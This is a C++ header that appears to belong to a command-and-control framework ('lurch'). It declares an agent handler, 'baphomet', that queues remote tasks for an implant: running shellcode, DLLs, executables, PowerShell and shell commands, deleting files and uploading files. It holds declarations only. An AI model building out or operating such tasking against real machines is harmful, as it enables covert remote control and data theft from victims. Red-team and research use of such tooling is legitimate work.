//
// Created by diago on 2024-04-25.
//

#ifndef AGENT_HPP
#define AGENT_HPP
#include "../../../util/argument_parser.hpp"
#include "../../base/base.hpp"

#define BAPHOMET_EXEC_IF_STAGED(cmd) if(cmd == "staged") { return print_staged_files(); }
#define BAPHOMET_EXEC_IF_RUNDLL(cmd) if(cmd == "rundll") { return rundll(cmd); }
#define BAPHOMET_EXEC_IF_RUNSHELLCODE(cmd) if(cmd == "runshellcode") { return runshellcode(cmd); }
#define BAPHOMET_EXEC_IF_RUNEXE(cmd) if(cmd == "runexe") { return runexe(cmd); }
#define BAPHOMET_EXEC_IF_TASKS(cmd) if(cmd == "tasks") { return print_tasks(); }
#define BAPHOMET_EXEC_IF_COMPLETE_TASK(cmd) if(cmd == "complete_task") { return complete_task(cmd); }
#define BAPHOMET_EXEC_IF_CLEAR_TASKS(cmd) if(cmd == "clear_tasks") { return clear_tasks(); }
#define BAPHOMET_EXEC_IF_HELP(cmd, accepted) if(cmd == "help") { return accepted.help(); }

#define BAPHOMET_EXEC_IF_CAT(cmd) if(cmd == "cat") {                                    \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--file-name", "-f").done()).value() },      \
        "Successfully queued cat."                                                      \
    );                                                                                  \
}                                                                                       \

#define BAPHOMET_EXEC_IF_CD(cmd) if(cmd == "cd") {                                      \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--directory", "-d").done()).value() },      \
        "Successfully queued directory change."                                         \
    );                                                                                  \
}                                                                                       \

#define BAPHOMET_EXEC_IF_MKDIR(cmd) if(cmd == "mkdir") {                                \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--directory", "-d").done()).value() },      \
       "Successfully queued directory creation."                                        \
    );                                                                                  \
}                                                                                       \

#define BAPHOMET_EXEC_IF_RM(cmd) if(cmd == "rm") {                                      \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--directory-entry", "-de").done()).value() },\
        "Successfully queued directory entry to be deleted."                            \
    );                                                                                  \
}                                                                                       \

#define BAPHOMET_EXEC_IF_PS(cmd) if(cmd == "ps") {                                      \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--command", "-c").done()).value() },        \
        "Successfully queued powershell command to be ran."                             \
    );                                                                                  \
}

#define BAPHOMET_EXEC_IF_CMD(cmd) if(cmd == "cmd") {                                    \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--command", "-c").done()).value() },        \
        "Successfully queued shell command to be ran."                                  \
    );                                                                                  \
}

#define BAPHOMET_EXEC_IF_UPLOAD(cmd) if(cmd == "upload") {                              \
    return generic_queue_task(                                                          \
        cmd,                                                                            \
        { std::get<0>(cmd.get<std::string>("--directory-entry", "-de").done()).value() },  \
         "Successfully queued file to be uploaded."                                     \
    );                                                                                  \
}

#define BAPHOMET_EXEC_IF_GET_TASK(cmd,ctx) if(cmd == "get_task") {                      \
    ctx.log_if_error = false;                                                           \
    return get_task();                                                                  \
}                                                                                       \



namespace lurch {
class baphomet final : public leaf {
private:
    std::queue<std::string> tasks;
    static accepted_commands commands;

public:

    result<std::string> runexe(const command& cmd);
    result<std::string> rundll(const command& cmd);
    result<std::string> runshellcode(const command& cmd);

    bool file_is_staged(const std::string& file_name) const;
    result<std::string> get_task() const;
    result<std::string> complete_task(const command& cmd);
    result<std::string> print_tasks() const;
    result<std::string> generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
    result<std::string> print_staged_files() const;
    result<std::string> clear_tasks();

    static result<std::string> delimit_command(const std::vector<std::string>& strings);
    static void init_commands();

    result<std::filesystem::path> upload(const std::string &file, const std::string &extension) override;
    result<std::string> receive(reciever_context& ctx) override;

    explicit baphomet(const std::optional<std::weak_ptr<owner>> &parent, instance* const root)
        : leaf(parent, root) {
    }
};

} // lurch

#endif //AGENT_HPP
